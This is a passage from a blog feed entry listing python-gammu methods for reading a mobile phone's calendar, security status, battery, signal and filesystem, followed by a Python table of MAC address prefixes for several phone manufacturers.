First element: <strong>cal = sm.GetNextCalendar(Start = True)</strong>
All the others: <strong>sm.GetNextCalendar(cal['Location'])</strong>
A specific element: <strong>sm.GetCalendar(Location = location)</strong></li>&nbsp;
    <li>Others methods</li>
<ul>
    <li><strong>EnterSecurityCode(Type,Code,NewPIN)</strong> #Type(String) PIN, PUK, PIN2, PUK2, Phone. Code and NewPin string</li>
    <li><strong>GetAlarm()</strong> #Return alarm set in phone</li>
    <li><strong>GetBatteryCharge()</strong> #Retrn battery infos</li>
    <li><strong>GetFileSystemStatus()</strong> #Return file system status</li>
    <li><strong>GetFolderListing("folder",True)</strong> #Get next filename from filesystem</li>
    <li><strong>GetSecurityStatus()</strong></li>
    <li><strong>GetSignalQuality()</strong></li>
</ul>&nbsp;
    <li>Interesting variables:
MAC_Prefixes = {
'Sony-Ericsson' : ['00:01:EC','00:0A:D9','00:0E:07','00:0F:DE','00:12:EE','00:15:E0',
'00:16:20','00:16:B8','00:18:13','00:19:63','00:1A:75','00:1B:59',
'00:1C:A4','00:1D:28','00:1E:45','00:80:37',
],
'Nokia' : ['00:02:EE','00:0B:E1','00:0E:ED','00:0F:BB','00:10:B3','00:11:9F',
'00:12:62','00:13:70','00:13:FD','00:14:A7','00:15:2A','00:15:A0',
'00:15:DE','00:16:4E','00:16:BC','00:17:4B','00:17:B0','00:18:0F',
'00:18:42','00:18:8D','00:18:C5','00:19:2D','00:19:4F','00:19:79',
'00:19:B7','00:1A:16','00:1A:89','00:1A:DC','00:1B:33','00:1B:AF',
'00:1B:EE','00:1C:35','00:1C:9A','00:1C:D4','00:1C:D6','00:1D:3B',
'00:1D:6E','00:1D:98','00:1D:E9','00:1D:FD','00:1E:3A','00:1E:3B',
'00:1E:A3','00:1E:A4','00:40:43','00:A0:8E',
'00:E0:03',
],
'Siemens' : ['00:01:E3','00:05:19','00:0B:23','00:0B:A3','00:0D:41','00:0E:8C',
'00:0F:BB','00:11:06','00:11:33','00:13:A3','00:18:D1','00:19:28','00:19:99',
'00:1A:D0','00:1A:E8','00:1B:1B','00:1C:06','00:30:05','00:50:07',
'00:90:40','00:C0:E4','08:00:06',
],
'Samsung' : ['00:00:F0','00:02:78','00:09:18','00:0D:AE','00:0D:E5','00:0F:73',
'00:12:47','00:12:FB','00:13:77','00:15:99','00:15:B9','00:16:32',
'00:16:6B','00:16:6C','00:16:DB','00:17:C9','00:17:D5','00:18:AF',
'00:1A:8A','00:1B:98','00:1C:43','00:1D:25','00:1D:F6','00:1E:7D',
'00:E0:64',
],
'LG' : ['00:05:C9','00:0B:29','00:12:56','00:14:80','00:19:A1','00:1C:62',
'00:1E:75','00:1E:B2','00:50:CE','00:E0:91',
],
'BenQ' : ['00:03:9D','00:17:CA',
],
'Motorola' : ['00:01:AF','00:04:56','00:04:BD','00:08:0E','00:0A:28','00:0B:06',
'00:0C:E5','00:0E:5C','00:0E:C7','00:0F:9F','00:11:1A','00:11:80',
'00:11:AE','00:12:25','00:12:8A','00:12:C9','00:13:71','00:14:04',
'00:14:9A','00:14:E8','00:15:2F','00:15:9A','00:15:A8','00:16:26',
'00:16:75','00:16:B5','00:17:00','00:17:84','00:17:E2','00:17:EE',
'00:18:A4','00:18:C0','00:19:2C','00:19:5E','00:19:A6','00:19:C0',
'00:1A:1B','00:1A:66','00:1A:77','00:1A:AD','00:1A:DB','00:1A:DE',
'00:1B:52','00:1B:DD','00:1C:11','00:1C:12','00:1C:C1','00:1C:FB',
'00:1D:6B','00:1D:BE','00:1E:46','00:1E:5A','00:1E:8D','00:20:40',
'00:20:75','00:A0:BF','00:C0:F9','00:E0:0C',
],
'Alcatel' : ['00:07:72','00:08:9A','00:0E:86','00:0F:62','00:11:3F','00:11:8B',
'00:15:3F','00:16:4D','00:17:CC','00:19:8F','00:1A:F0','00:1C:8E',
'00:1D:4C','00:20:32','00:20:60','00:20:DA','00:80:21','00:80:39',
'00:80:9F','00:A0:81','00:C0:BE','00:D0:95','00:D0:F6','00:E0:B1',
'00:E0:DA',
],
}</li>
</ul>

]]></content>
  </entry>
  
</feed>
